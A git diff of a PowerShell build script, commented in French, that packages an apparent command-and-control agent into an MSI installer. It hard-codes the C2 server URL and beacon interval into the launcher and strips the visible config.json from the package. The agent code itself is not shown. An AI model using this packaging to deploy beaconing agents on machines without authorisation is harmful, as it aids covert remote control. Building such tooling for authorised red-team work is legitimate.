@@ -83,6 +83,7 @@ if (-not $WixPath) {
 $wxsFile = Join-Path -Path $PSScriptRoot -ChildPath "C2Agent.wxs"
 $configFile = Join-Path -Path $PSScriptRoot -ChildPath "config.json"
 $launcherFile = Join-Path -Path $PSScriptRoot -ChildPath "launcher.ps1"
+$agentFile = Join-Path -Path $PSScriptRoot -ChildPath "agent_active.ps1"
 
 Write-Log "Vérification des fichiers source..." "INFO"
 
@@ -98,6 +99,11 @@ if (-not (Test-Path -Path $configFile)) {
 
 if (-not (Test-Path -Path $launcherFile)) {
     Write-Log "Fichier launcher non trouvé: $launcherFile" "ERROR"
+    exit 1
+}
+
+if (-not (Test-Path -Path $agentFile)) {
+    Write-Log "Fichier agent_active.ps1 non trouvé: $agentFile" "ERROR"
     exit 1
 }
 
@@ -119,12 +125,76 @@ if (-not (Test-Path -Path $lightPath)) {
 
 Write-Log "Outils WiX trouvés" "SUCCESS"
 
-# Créer le répertoire de sortie s'il n'existe pas
-if (-not (Test-Path -Path $OutputDir)) {
-    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
+# ===== INJECTION DE CONFIGURATION =====
+
+Write-Log "" "INFO"
+Write-Log "Lecture de la configuration depuis config.json..." "INFO"
+
+try {
+    $config = Get-Content -Path $configFile -Raw | ConvertFrom-Json
+    $serverUrl = $config.agent.serverUrl
+    $beaconInterval = $config.agent.beaconInterval
+    $logFile = $config.agent.logFile
+    
+    Write-Log "✅ Configuration chargée:" "SUCCESS"
+    Write-Log "   Server URL: $serverUrl" "INFO"
+    Write-Log "   Beacon Interval: $beaconInterval secondes" "INFO"
+    Write-Log "   Log File: $logFile" "INFO"
+}
+catch {
+    Write-Log "Erreur lors de la lecture de config.json: $_" "ERROR"
+    exit 1
 }
 
-# Fichiers intermédiaires
+# Créer launcher.ps1 injecté avec les paramètres
+Write-Log "" "INFO"
+Write-Log "Injection des paramètres dans launcher.ps1..." "INFO"
+
+$launcherContent = Get-Content -Path $launcherFile -Raw
+
+# Remplacer les valeurs par défaut
+$injectedLauncher = $launcherContent `
+    -replace 'ConfigPath = "\$PSScriptRoot\\config\.json"', "ConfigPath = `"INJECTED`"" `
+    -replace 'Expand-EnvironmentVariables \$config\.agent\.serverUrl', "`"$serverUrl`"" `
+    -replace 'Expand-EnvironmentVariables \$config\.agent\.beaconInterval', "$beaconInterval" `
+    -replace 'Expand-EnvironmentVariables \$config\.agent\.logFile', "`"$logFile`""
+
+# Également remplacer directement les variables utilisées
+$injectedLauncher = $injectedLauncher `
+    -replace '\$serverUrl = \$config\.agent\.serverUrl', "`$serverUrl = `"$serverUrl`"" `
+    -replace '\$beaconInterval = \$config\.agent\.beaconInterval', "`$beaconInterval = $beaconInterval" `
+    -replace '\$logFilePath = Expand-EnvironmentVariables \$config\.agent\.logFile', "`$logFilePath = `"$([System.Environment]::ExpandEnvironmentVariables($logFile))`""
+
+# Sauvegarder le launcher injecté temporairement
+$injectedLauncherPath = Join-Path -Path $PSScriptRoot -ChildPath "launcher.ps1.injected"
+Set-Content -Path $injectedLauncherPath -Value $injectedLauncher
+
+Write-Log "✅ launcher.ps1 injecté créé" "SUCCESS"
+
+# Modifier temporairement C2Agent.wxs pour pointer vers le launcher injecté et enlever config.json
+Write-Log "" "INFO"
+Write-Log "Modification temporaire de C2Agent.wxs..." "INFO"
+
+$wxsContent = Get-Content -Path $wxsFile -Raw
+$wxsBackup = $wxsContent
+
+# Remplacer la référence launcher.ps1 par launcher.ps1.injected
+$wxsModified = $wxsContent `
+    -replace 'Source="launcher\.ps1"', 'Source="launcher.ps1.injected"'
+
+# Enlever le composant config.json
+$wxsModified = $wxsModified `
+    -replace '(?s)<!-- Fichier de configuration -->.*?</Component>', '<!-- ConfigFile removed during build -->'
+
+# Enlever la référence au ConfigFile dans Feature
+$wxsModified = $wxsModified `
+    -replace '<ComponentRef Id="ConfigFile" />', '<!-- ConfigFile reference removed -->'
+
+Set-Content -Path $wxsFile -Value $wxsModified
+
+Write-Log "✅ C2Agent.wxs modifié temporairement" "SUCCESS"
+
+# Créer le répertoire de sortie s'il n'existe pas
 $wixobjFile = Join-Path -Path $OutputDir -ChildPath "C2Agent.wixobj"
 $msiFile = Join-Path -Path $OutputDir -ChildPath "C2Agent.msi"
 
@@ -188,12 +258,32 @@ if (Test-Path -Path $msiFile) {
     Write-Log "" "INFO"
     
     # Nettoyer les fichiers intermédiaires
+    Write-Log "Nettoyage des fichiers temporaires..." "INFO"
+    
     if (Test-Path -Path $wixobjFile) {
         Remove-Item -Path $wixobjFile -Force
-        Write-Log "Fichier intermédiaire supprimé: $wixobjFile" "DEBUG"
+        Write-Log "Fichier supprimé: $wixobjFile" "DEBUG"
     }
+    
+    if (Test-Path -Path $injectedLauncherPath) {
+        Remove-Item -Path $injectedLauncherPath -Force
+        Write-Log "Fichier supprimé: $injectedLauncherPath" "DEBUG"
+    }
+    
+    # Restaurer C2Agent.wxs
+    Set-Content -Path $wxsFile -Value $wxsBackup
+    Write-Log "C2Agent.wxs restauré à son état original" "DEBUG"
+    
+    Write-Log "✅ Nettoyage terminé" "SUCCESS"
 }
 else {
     Write-Log "Erreur: Le fichier MSI n'a pas été créé" "ERROR"
+    
+    # Nettoyer même en cas d'erreur
+    if (Test-Path -Path $injectedLauncherPath) {
+        Remove-Item -Path $injectedLauncherPath -Force
+    }
+    Set-Content -Path $wxsFile -Value $wxsBackup
+    
     exit 1
 }
